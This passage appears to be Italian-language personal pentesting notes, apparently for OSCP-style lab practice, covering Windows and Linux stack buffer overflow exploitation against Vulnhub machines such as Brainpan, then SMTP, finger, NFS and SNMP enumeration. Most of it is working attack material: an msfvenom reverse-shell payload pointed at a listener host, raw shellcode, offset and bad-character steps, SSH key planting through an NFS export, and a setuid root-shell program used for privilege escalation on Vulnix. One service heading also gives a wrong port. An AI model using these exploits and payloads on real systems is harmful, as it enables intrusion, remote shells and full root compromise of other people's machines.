13. Exeguire generate_bad_chars.py e copiare il payload in exploit.py ed eseguirlo

14. Andare su immunity debugger ed eseguire ```!mona compare -f C:\mona\oscp\bytearray.bin -a addr_esp``` (attenta al path) e sostituire l'indirizzo dell'esp 
15. Se ci sono bad characters rifare il giro dal punto 12 aggiungendo i caratteri

16. Una volta trovati i bad characters ```!mona jmp -r esp -cpb "\x00\x08\x2c\xad"``` (sostituire nelle virgolette, i bad characters trovati prima)
17. Prendere uno degli indirizzi che escono dal punto 16 e inserirlo in exploit.py in retn (esattamente così 0x311712f3) (rimettere la riga di codice ```buffer += struct.pack('<I', retn)```)

18. Generare shellcode ```msfvenom -p windows/shell_reverse_tcp LHOST=10.8.80.159 LPORT=5555 EXITFUNC=thread -b "\x00\x08\x2c\xad" -f py -v payload``` (dipende che sistema si ha)

19. Inserire il payload in exploit.py in questo formato:
payload = ("\xba\x13\x24\xb9\x47\xda\xc3\xd9\x74\x24\xf4\x5e"
"\x2b\xc9\xb1\x12\x83\xc6\x04\x31\x56\x0e\x03\x45"
"\x2a\x5b\xb2\x58\xe9\x6c\xde\xc9\x4e\xc0\x4b\xef"
"\xd9\x07\x3b\x89\x14\x47\xaf\x0c\x17\x77\x1d\x2e"
"\x1e\xf1\x64\x46\x61\xa9\x96\xeb\x09\xa8\x98\x06"
"\x79\x25\x79\x98\x1b\x66\x2b\x8b\x50\x85\x42\xca"
"\x5a\x0a\x06\x64\x0b\x24\xd4\x1c\xbb\x15\x35\xbe"
"\x52\xe3\xaa\x6c\xf6\x7a\xcd\x20\xf3\xb1\x8e")

Aggiungere anche:
nop_size = 20
padding = "\x90" * nop_size

20. Mettere in listening ed eseguire exploit.py



##### Linux

1. Trovare la lunghezza di stringa che fa crashare l'applicativo, per generare si può eseguire da gdb:
```run $(python -c "print('A'*100)")```

Aumentando fino a che non crasha

2. Trovata la lunghezza (in questo caso 200), generare il payload:
```
└─$ /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 200 
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
```

3. Rieseguire l'applicativo con la stringa generata al punto 2:
```
(gdb) run Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
Starting program: /home/kali/Documents/Vulnhub/Brainpan1/validate Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag

Program received signal SIGSEGV, Segmentation fault.
0x39644138 in ?? ()
```

4. Per trovare l'offset, si prende l'indirizzo di memoria che dà gdb quando l'applicativo crasha:
```
└─$ /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 39644138 
[*] Exact match at offset 116
```

5. Si testa se effettivamente l'offset è giusto:
```
(gdb) run $(python -c "print('A'*116 + 'BBBB' + 'C'*(200-116-4))")
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/kali/Documents/Vulnhub/Brainpan1/validate $(python -c "print('A'*116 + 'BBBB' + 'C'*(200-116-4))")

Program received signal SIGSEGV, Segmentation fault.
0x42424242 in ?? ()
```



6. Si deve trovare il return address: (l'applicativo in questo caso si chiama **validate**)
objdump -D *nome_applicativo* | grep call| grep eax
```
└─$ objdump -D validate | grep call| grep eax
 8048468:	ff 14 85 14 9f 04 08 	call   *0x8049f14(,%eax,4)
 80484af:	ff d0                	call   *%eax
 804862b:	ff d0                	call   *%eax
```

7. Ora si può inserire una shellcode con il return address: (In questo caso la shellcode stampa solo la stringa "Owned!!!")
```
gdb-peda$ run $(python2.7 -c "import struct; shellcode='\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\x04\xb3\x01\x68\x64\x21\x21\x21\x68\x4f\x77\x6e\x65\x89\xe1\xb2\x08\xcd\x80\xb0\x01\x31\xdb\xcd\x80'; print('\x90'*10+shellcode +'A'*(116-10-len(shellcode)) + struct.pack('<I', 0x080484af))")


Starting program: /home/kali/Documents/Vulnhub/Brainpan1/validate $(python2.7 -c "import struct; shellcode='\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\x04\xb3\x01\x68\x64\x21\x21\x21\x68\x4f\x77\x6e\x65\x89\xe1\xb2\x08\xcd\x80\xb0\x01\x31\xdb\xcd\x80'; print('\x90'*10+shellcode +'A'*(116-10-len(shellcode)) + struct.pack('<I', 0x080484af))")
Owned!!![Inferior 1 (process 101558) exited normally]
```

**shellcode for /bin/sh**
shellcode =
"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\x6a\x0b\x5
8\xcd\x80"

**Oppure si può generare con:**
msfvenom -p linux/x86/exec CMD=/bin/sh -a x86 -b ‘x00x0ax0dx20x46’ -e x86/shikata_ga_nai -f c


Per i bad characters:
```
run $(python -c"print('A'*116+'BBBB'+'\x90'*16+'\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff')")
```

Cioè:
```
gdb-peda$ run $(python -c"print('A'*116+'BBBB'+'\x90'*16+'\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff')")
Starting program: /home/kali/Documents/Vulnhub/Brainpan1/validate $(python -c"print('A'*116+'BBBB'+'\x90'*16+'\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff')")

Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
EAX: 0xffffcce8 ('A' <repeats 116 times>, "BBBB", '\302\220' <repeats 16 times>, "\001\002\003\004\005\006\a\b")
EBX: 0x41414141 ('AAAA')
ECX: 0xffffd0d0 --> 0xd0c0b00 ('')
EDX: 0xffffcd88 --> 0x0 
ESI: 0xf7fa9000 --> 0x1e4d6c 
EDI: 0xf7fa9000 --> 0x1e4d6c 
EBP: 0x41414141 ('AAAA')
ESP: 0xffffcd60 --> 0x90c290c2 
EIP: 0x42424242 ('BBBB')
EFLAGS: 0x10282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x42424242
[------------------------------------stack-------------------------------------]
0000| 0xffffcd60 --> 0x90c290c2 
0004| 0xffffcd64 --> 0x90c290c2 
0008| 0xffffcd68 --> 0x90c290c2 
0012| 0xffffcd6c --> 0x90c290c2 
0016| 0xffffcd70 --> 0x90c290c2 
0020| 0xffffcd74 --> 0x90c290c2 
0024| 0xffffcd78 --> 0x90c290c2 
0028| 0xffffcd7c --> 0x90c290c2 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x42424242 in ?? ()
```

L'applicativo crasha e si vede la memoria con il comando ```x/100x $eax```
```
gdb-peda$ x/100x $eax
0xffffcce8:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffccf8:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffcd08:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffcd18:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffcd28:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffcd38:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffcd48:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffcd58:	0x41414141	0x42424242	0x90c290c2	0x90c290c2
0xffffcd68:	0x90c290c2	0x90c290c2	0x90c290c2	0x90c290c2
0xffffcd78:	0x90c290c2	0x90c290c2	0x04030201	0x08070605
0xffffcd88:	0x00000000	0xf7de2e46	0x00000004	0xffffce34
0xffffcd98:	0xffffce48	0xffffcdc4	0xffffcdd4	0xf7ffdb40
0xffffcda8:	0xf7fca410	0xf7fa9000	0x00000001	0x00000000
0xffffcdb8:	0xffffce18	0x00000000	0xf7ffd000	0x00000000
0xffffcdc8:	0xf7fa9000	0xf7fa9000	0x00000000	0x6359a04d
0xffffcdd8:	0x20997e5d	0x00000000	0x00000000	0x00000000
0xffffcde8:	0x00000004	0x08048400	0x00000000	0xf7fe88f0
0xffffcdf8:	0xf7fe3230	0xf7ffd000	0x00000004	0x08048400
0xffffce08:	0x00000000	0x08048421	0x08048538	0x00000004
0xffffce18:	0xffffce34	0x080485b0	0x080485a0	0xf7fe3230
0xffffce28:	0xffffce2c	0x0000001c	0x00000004	0xffffd000
0xffffce38:	0xffffd030	0xffffd0d1	0xffffd0e7	0x00000000
0xffffce48:	0xffffd247	0xffffd275	0xffffd2c1	0xffffd2d3
0xffffce58:	0xffffd2e3	0xffffd2fc	0xffffd329	0xffffd359
0xffffce68:	0xffffd397	0xffffd3b8	0xffffd3c2	0xffffd3d8
```

All'indirizzo di memoria 0xffffcd78 si vede che il payload che ho inserito arriva fino a \x08 e poi c'è \x00 nell'indirizzo di memoria successivo, questo vuol dire che \x09 è un bad characters

E si continua così fino a quando o il payload è troppo lungo e quindi l'applicativo non crasha, oppure crasha ma ci sono tutti i caratteri che si sono inseriti nel payload



### SMTP (port 23)
```
└─$ smtp-user-enum -M VRFY -U /usr/share/metasploit-framework/data/wordlists/unix_users.txt -t 192.168.1.102
```

Con metasploit: auxiliary/scanner/smtp/smtp_enum


### Linux fingerd (port 79)

Con metasploit: auxiliary/scanner/finger/finger_users

Per enumerazione utenti: (Sta in **~/Programs**)
https://github.com/Kan1shka9/Finger-User-Enumeration
```
./finger_enum_user.sh ~/Documents/Vulnhub/Hacklab_Vulnix/user.txt
```

Sample output:
```
$ ./finger_enum_user.sh users.txt
User : user
Login: user           			Name: user
Directory: /home/user               	Shell: /bin/bash
Last login Tue May 16 01:47 (BST) on pts/0 from 192.168.1.34
No mail.
No Plan.

Login: dovenull       			Name: Dovecot login user
Directory: /nonexistent             	Shell: /bin/false
Never logged in.
No mail.
No Plan.
```

N.B Check for the parameter "Directory:" in the output, if /home/username means that it is a valid user on the system.



### NFS (Port 2049)
```
└─$ showmount -e 192.168.1.102
Export list for 192.168.1.102:
/home/vulnix *
``` 
```
(base) ┌──(kali㉿kali)-[~/Documents/Vulnhub/Hacklab_Vulnix]
└─$ mkdir home2

(base) ┌──(kali㉿kali)-[~/Documents/Vulnhub/Hacklab_Vulnix]
└─$ mount -t nfs 192.168.1.102:/home/vulnix home2 -o nolock
```

Oppure usare **nfsshell**:
```
└─$ sudo ./nfsshell
nfs> host 192.168.1.102
Using a privileged port (1023)
Open 192.168.1.102 (192.168.1.102) TCP
nfs> export
Export list for 192.168.1.102:
/home/vulnix             * 
nfs> mount ~/Documents/Vulnhub/Hacklab_Vulnix/home/
Using a privileged port (1022)
Mount failed: Permission denied
```

In questo caso non ho i permessi per vedere il contenuto della cartella però utilizzando i comandi ```uid``` e ```gid``` posso settare i permessi giusti dell'utente per vedere il contenuto.
Quindi metti caso che sei entrato in ssh con un utente, tu prendi da /etc/passwd 
```
vulnix:x:2008:2008::/home/vulnix:/bin/bash
```

Si può o settare l'uid con nfsshell:
```
nfs> uid 2008
nfs> ls
.
..
.bash_history
.bash_logout
.bashrc
.cache
.profile
```

Oppure si può aggiungere nella propria macchina un utente con quell'uid:
```
└─$ sudo useradd -u 2008 vulnix
                                                                                                                  
(base) ┌──(kali㉿kali)-[~/Programs/unix-privesc-check-1.4]
└─$ tail /etc/passwd
king-phisher:x:132:140::/var/lib/king-phisher:/usr/sbin/nologin
kali:x:1000:1000:Kali,,,:/home/kali:/usr/bin/zsh
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
pwn:x:1004:1004:,,,:/home/pwn:/bin/bash
uuidd:x:134:143::/run/uuidd:/usr/sbin/nologin
ftpuser:x:1006:1006::/dev/null:/etc
ftp:x:133:142:ftp daemon,,,:/var/ftp:/bin/false
beef-xss:x:135:144::/var/lib/beef-xss:/usr/sbin/nologin
redis:x:136:145::/var/lib/redis:/usr/sbin/nologin
vulnix:x:2008:2008::/home/vulnix:/bin/sh
```

E poi si monta la directory da root e poi si passa all'utente creato:
```
┌──(root💀kali)-[/home/kali/Programs/unix-privesc-check-1.4]
└─$ mount -t nfs 192.168.1.102:/home/vulnix /home/kali/Documents/Vulnhub/Hacklab_Vulnix/home -o nolock
                                                                                                                                                               
┌──(root💀kali)-[/home/kali/Programs/unix-privesc-check-1.4]
└─# su vulnix
$ cd /home/kali/Documents/Vulnhub/Hacklab_Vulnix/home
$ ls -la
total 20
drwxr-x--- 2 vulnix vulnix 4096 Sep  2  2012 .
drwxr-xr-x 3 kali   kali   4096 Jun  6 11:20 ..
-rw-r--r-- 1 vulnix vulnix  220 Apr  3  2012 .bash_logout
-rw-r--r-- 1 vulnix vulnix 3486 Apr  3  2012 .bashrc
-rw-r--r-- 1 vulnix vulnix  675 Apr  3  2012 .profile
```

Poi per continuare l'attacco, si può inserire una chiave ssh in questa directory:
1. Genero chiave:
```
(base) ┌──(kali㉿kali)-[~/Documents/Vulnhub/Hacklab_Vulnix]
└─$ ssh-keygen            
Generating public/private rsa key pair.
Enter file in which to save the key (/home/kali/.ssh/id_rsa): id_rsa_vulnix
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in id_rsa_vulnix
Your public key has been saved in id_rsa_vulnix.pub
The key fingerprint is:
SHA256:NFEWBOcRexrVCkXFRoIUFL0NkfUN63ZRxPmWcRm27kw kali@kali
The key's randomart image is:
+---[RSA 3072]----+
|        o*&X*O==*|
|         =o++.=B*|
|        o +..*.oB|
|       . . +o.o.+|
|        S .   oE.|
|             .+. |
|               o |
|                 |
|                 |
+----[SHA256]-----+

(base) ┌──(kali㉿kali)-[~/Documents/Vulnhub/Hacklab_Vulnix]
└─$ cat id_rsa_vulnix.pub 
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCa2oTKTIzaYCieWckD9XLCr5FDTwPK2QTfB8JG5P8T6sULeZc0jLCeHEKcFuLGhGVfgBeKLvoOvR9i+LcLqpCTKmNnRmkFdBnUXCB2t5A8RMaLwxU7oKThCVrgB9yX7ccDD4NTHjh9DvfS0ePSqF5Vl3D0UQyLo51aK9sowhlQ9qUOigI0SKQOJRl2i/EZr5MeJlwZICiYn6xRi/TOUca2rz4gwlefoxdHtzNJu6Zk7lMrVEjh0+DZdAjsru6CZPIRaZsPCS995LSRnh0HDk4GFbmekeNmftRxMKGrJqbsCE6x7IoqERRga10mFjjMgz3BTgyjCsKjrqV/TM5Ed2BAA9YsSwXtYOXqnI5WL0deTzw2xqCox25nS8LZwzoF89tXfwEYl5OOBmF7BokmfFVH1dTGZ1POP84rPcZT2eHivAiL17kOrJOUBGpKGkDpYsWA7SlbMJU88W+7UnZkkUtoc9NI0UyMZ3f6eSDyqkPjkZKcm/3kj3FM9TNvR/BhsL8= kali@kali
```

2. Copio il .pub nelle authorized key della macchina:
```
$ mkdir .ssh
$ ls
$ ls -la
total 24
drwxr-x--- 3 vulnix vulnix 4096 Jun  6 07:19 .
drwxr-xr-x 3 kali   kali   4096 Jun  6 11:20 ..
-rw-r--r-- 1 vulnix vulnix  220 Apr  3  2012 .bash_logout
-rw-r--r-- 1 vulnix vulnix 3486 Apr  3  2012 .bashrc
-rw-r--r-- 1 vulnix vulnix  675 Apr  3  2012 .profile
drwxr-xr-x 2 vulnix vulnix 4096 Jun  6 07:19 .ssh
$ cd .ssh	
$ echo ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCa2oTKTIzaYCieWckD9XLCr5FDTwPK2QTfB8JG5P8T6sULeZc0jLCeHEKcFuLGhGVfgBeKLvoOvR9i+LcLqpCTKmNnRmkFdBnUXCB2t5A8RMaLwxU7oKThCVrgB9yX7ccDD4NTHjh9DvfS0ePSqF5Vl3D0UQyLo51aK9sowhlQ9qUOigI0SKQOJRl2i/EZr5MeJlwZICiYn6xRi/TOUca2rz4gwlefoxdHtzNJu6Zk7lMrVEjh0+DZdAjsru6CZPIRaZsPCS995LSRnh0HDk4GFbmekeNmftRxMKGrJqbsCE6x7IoqERRga10mFjjMgz3BTgyjCsKjrqV/TM5Ed2BAA9YsSwXtYOXqnI5WL0deTzw2xqCox25nS8LZwzoF89tXfwEYl5OOBmF7BokmfFVH1dTGZ1POP84rPcZT2eHivAiL17kOrJOUBGpKGkDpYsWA7SlbMJU88W+7UnZkkUtoc9NI0UyMZ3f6eSDyqkPjkZKcm/3kj3FM9TNvR/BhsL8= kali@kali >  authorized_keys
$ ls -la
total 12
drwxr-xr-x 2 vulnix vulnix 4096 Jun  6 07:20 .
drwxr-x--- 3 vulnix vulnix 4096 Jun  6 07:19 ..
-rw-r--r-- 1 vulnix vulnix  563 Jun  6 07:20 authorized_keys
```

3. Accedo in ssh:
```
(base) ┌──(kali㉿kali)-[~/Documents/Vulnhub/Hacklab_Vulnix]
└─$ ssh -i id_rsa_vulnix vulnix@192.168.1.102
Enter passphrase for key 'id_rsa_vulnix': 
Welcome to Ubuntu 12.04.1 LTS (GNU/Linux 3.2.0-29-generic-pae i686)

 * Documentation:  https://help.ubuntu.com/

  System information as of Sun Jun  6 12:21:14 BST 2021

  System load:  0.0              Processes:           88
  Usage of /:   90.3% of 773MB   Users logged in:     0
  Memory usage: 12%              IP address for eth0: 192.168.1.102
  Swap usage:   0%

  => / is using 90.3% of 773MB

  Graph this data and manage this system at https://landscape.canonical.com/

Your Ubuntu release is not supported anymore.
For upgrade information, please visit:
http://www.ubuntu.com/releaseendoflife

New release '14.04.6 LTS' available.
Run 'do-release-upgrade' to upgrade to it.


The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

vulnix@vulnix:~$ ls -la
total 28
drwxr-x--- 4 vulnix vulnix 4096 Jun  6 12:21 .
drwxr-xr-x 4 root   root   4096 Sep  2  2012 ..
-rw-r--r-- 1 vulnix vulnix  220 Apr  3  2012 .bash_logout
-rw-r--r-- 1 vulnix vulnix 3486 Apr  3  2012 .bashrc
drwx------ 2 vulnix vulnix 4096 Jun  6 12:21 .cache
-rw-r--r-- 1 vulnix vulnix  675 Apr  3  2012 .profile
drwxr-xr-x 2 vulnix vulnix 4096 Jun  6 12:20 .ssh
```

In nfs c'è questa impostazione root_squash
root_squash: Fa in modo che tutti gli accessi dei client al filesystem esportato, effettuati da utenti root sulle macchine client, avvengano come user ID per l'utente nobody. Questo in effetti "declassa" il potere dell'utente root remoto a quello del più semplice utente locale, impedendo una alterazione dei file non autorizzata sul server remoto. In alternativa, l'opzione no_root_squash disabilita questa funzione.

```
vulnix@vulnix:~$ cat /etc/exports
# /etc/exports: the access control list for filesystems which may be exported
#		to NFS clients.  See exports(5).
#
# Example for NFSv2 and NFSv3:
# /srv/homes       hostname1(rw,sync,no_subtree_check) hostname2(ro,sync,no_subtree_check)
#
# Example for NFSv4:
# /srv/nfs4        gss/krb5i(rw,sync,fsid=0,crossmnt,no_subtree_check)
# /srv/nfs4/homes  gss/krb5i(rw,sync,no_subtree_check)
#
/home/vulnix	*(rw,root_squash)
```

Vedendo con sudo -l:
```
vulnix@vulnix:~$ sudo -l
Matching 'Defaults' entries for vulnix on this host:
    env_reset, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User vulnix may run the following commands on this host:
    (root) sudoedit /etc/exports, (root) NOPASSWD: sudoedit /etc/exports
```

Abbiamo la possibilità di modificare quel file di configurazione per permettere al nostro utente root di scrivere sulla directory nfs.
```
vulnix@vulnix:~$ sudoedit /etc/exports
vulnix@vulnix:~$ cat /etc/exports
# /etc/exports: the access control list for filesystems which may be exported
#		to NFS clients.  See exports(5).
#
# Example for NFSv2 and NFSv3:
# /srv/homes       hostname1(rw,sync,no_subtree_check) hostname2(ro,sync,no_subtree_check)
#
# Example for NFSv4:
# /srv/nfs4        gss/krb5i(rw,sync,fsid=0,crossmnt,no_subtree_check)
# /srv/nfs4/homes  gss/krb5i(rw,sync,no_subtree_check)
#
/home/vulnix	*(rw,no_root_squash)
```

Non avendo la possibilità di riavviare il servizio nfs, riavviamo la macchina.
Così riusciamo ad accedere con il nostro root:
```
┌──(root💀kali)-[/home/kali/Documents/Vulnhub/Hacklab_Vulnix]
└─# mount -t nfs 192.168.1.102:/home/vulnix /home/kali/Documents/Vulnhub/Hacklab_Vulnix/home
                                                                                                                                                                        
┌──(root💀kali)-[/home/kali/Documents/Vulnhub/Hacklab_Vulnix]
└─# ls -la home/
total 32
drwxr-x--- 4 vulnix vulnix 4096 Jun  6 07:37 .
drwxr-xr-x 3 kali   kali   4096 Jun  6 11:43 ..
-rw------- 1 vulnix vulnix  338 Jun  6 07:40 .bash_history
-rw-r--r-- 1 vulnix vulnix  220 Apr  3  2012 .bash_logout
-rw-r--r-- 1 vulnix vulnix 3486 Apr  3  2012 .bashrc
drwx------ 2 vulnix vulnix 4096 Jun  6 07:21 .cache
-rw-r--r-- 1 vulnix vulnix  675 Apr  3  2012 .profile
drwxr-xr-x 2 vulnix vulnix 4096 Jun  6 07:20 .ssh
```

Ora posso creare un file che apre una shell con i permessi di root e caricarla sulla directory nfs per poi avviarla con l'utente con low-privileges:
(Volendo potevo copiargli direttamente /bin/bash (dargli sempre ```chmod 4777 /bin/bash``` e poi sulla macchina vittima dovevo eseguire ```/bin/bash -p``` per far rimanere i privilegi settati) ma essendo architetture diverse, mi dava problemi quando provavo ad eseguirlo poi sulla macchina vittima)
Quindi ho creato un file bash.c:

```
int main()
{
     setgid(0);
     setuid(0);
     system("/bin/bash");
}
```
E l'ho caricato e compilato (perchè sulla macchina vittima non c'era gcc e gli ho dato i permessi di suid)
```
┌──(root💀kali)-[/home/…/Documents/Vulnhub/Hacklab_Vulnix/home]
└─# gcc -o setuid bash.c -m32
bash.c: In function ‘main’:
bash.c:3:6: warning: implicit declaration of function ‘setgid’ [-Wimplicit-function-declaration]
    3 |      setgid(0);
      |      ^~~~~~
bash.c:4:6: warning: implicit declaration of function ‘setuid’ [-Wimplicit-function-declaration]
    4 |      setuid(0);
      |      ^~~~~~
bash.c:5:6: warning: implicit declaration of function ‘system’ [-Wimplicit-function-declaration]
    5 |      system("/bin/bash");
      |      ^~~~~~
                                                                                                                  
┌──(root💀kali)-[/home/…/Documents/Vulnhub/Hacklab_Vulnix/home]
└─# chmod 4777 setuid 
```

Poi dalla macchina vittima:
```
vulnix@vulnix:~$ ls -la
total 52
drwxr-x--- 4 vulnix vulnix  4096 Jun  6 17:13 .
drwxr-xr-x 4 root   root    4096 Sep  2  2012 ..
-rw-r--r-- 1 root   root      73 Jun  6 17:13 bash.c
-rw------- 1 vulnix vulnix   359 Jun  6 17:06 .bash_history
-rw-r--r-- 1 vulnix vulnix   220 Apr  3  2012 .bash_logout
-rw-r--r-- 1 vulnix vulnix  3486 Apr  3  2012 .bashrc
drwx------ 2 vulnix vulnix  4096 Jun  6 12:21 .cache
-rw-r--r-- 1 vulnix vulnix   675 Apr  3  2012 .profile
-rwsrwxrwx 1 root   root   15564 Jun  6 17:13 setuid
drwxr-xr-x 2 vulnix vulnix  4096 Jun  6 12:20 .ssh
vulnix@vulnix:~$ id
uid=2008(vulnix) gid=2008(vulnix) groups=2008(vulnix)
vulnix@vulnix:~$ exit
exit
vulnix@vulnix:~$ ./setuid 
root@vulnix:~# id
uid=0(root) gid=0(root) groups=0(root),2008(vulnix)
```



### SNMP

Enumeration:
```
(base) ┌──(kali㉿kali)-[~/Programs/Finger-User-Enumeration]
└─$ snmpwalk -v2c -c public 192.168.199.42
```

```
